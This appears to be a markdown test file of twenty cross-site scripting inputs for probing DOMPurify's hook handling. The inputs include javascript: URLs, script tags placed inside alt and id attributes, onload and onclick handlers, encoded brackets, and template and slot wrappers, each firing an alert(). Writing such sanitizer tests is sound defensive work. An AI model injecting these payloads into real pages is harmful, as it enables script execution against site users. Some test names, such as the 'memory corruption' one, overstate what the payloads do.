# DOMPurify Hook Timing and Race Conditions

## Test 1: Hook execution order dependency
<a href="javascript:alert('before')" alt="<script>alert('hook')</script>">test</a>

## Test 2: Multiple attribute processing race
<img src="javascript:alert('src')" href="javascript:alert('href')" alt="<script>alert('alt')</script>" />

## Test 3: Hook state pollution between sanitization calls
<div id="<script>alert('id')</script>">content</div>

## Test 4: Node modification during hook execution
<a href="javascript:alert('href')" onclick="this.href='javascript:alert(\"race\")'">test</a>

## Test 5: Alt attribute HTML injection bypass
<img alt="&lt;script&gt;alert('escaped')&lt;/script&gt;" src="https://example.com/img.jpg" />

## Test 6: Complex alt attribute with nested quotes
<img alt='Mix"ed &#39;quo&#34;tes <script>' src="https://example.com/img.jpg" />

## Test 7: Alt attribute with encoded brackets
<img alt="&#91;malicious&#93;&#40;javascript:alert&#41;" src="https://example.com/img.jpg" />

## Test 8: Hook bypassing dangerous characters in alt
<img alt="<>&=&quot;'[]" src="https://example.com/img.jpg" />

## Test 9: Attribute modification after sanitization
<img src="data:image/gif;base64,R0lGODlhAQABAIAAAP" onload="this.src='javascript:alert(1)'" />

## Test 10: Hook execution with malformed attributes
<img alt='test" href="javascript:alert("attr")' src="https://example.com/img.jpg" />

## Test 11: Node replacement during hook processing
<a href="javascript:alert('replace')"><script>document.currentScript.parentNode.href='evil'</script>test</a>

## Test 12: Recursive hook triggering
<div id="test"><img alt="<img src='javascript:alert(\"recursive\")'>" /></div>

## Test 13: Memory corruption via large alt attribute
<img alt="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<script>alert('overflow')</script>" src="https://example.com/img.jpg" />

## Test 14: Hook interference with URL normalization
<a href="javascript:alert('url')" data-hook-interference="true">test</a>

## Test 15: Concurrent attribute processing
<div><a href="javascript:1"></a><img src="javascript:2" /><iframe src="javascript:3"></iframe></div>

## Test 16: Hook cleanup bypass
<img alt="<script>setTimeout(()=>alert('cleanup'),1)</script>" src="https://example.com/img.jpg" />

## Test 17: Node detachment during processing
<a href="javascript:alert('detach')"><span>test</span></a>

## Test 18: Attribute casing confusion in hooks
<IMG ALT="<SCRIPT>alert('case')</SCRIPT>" SRC="https://example.com/img.jpg" />

## Test 19: Document fragment confusion
<template><img alt="<script>alert('template')</script>" /></template>

## Test 20: Shadow DOM bypass attempt
<div><slot><img alt="<script>alert('shadow')</script>" /></slot></div>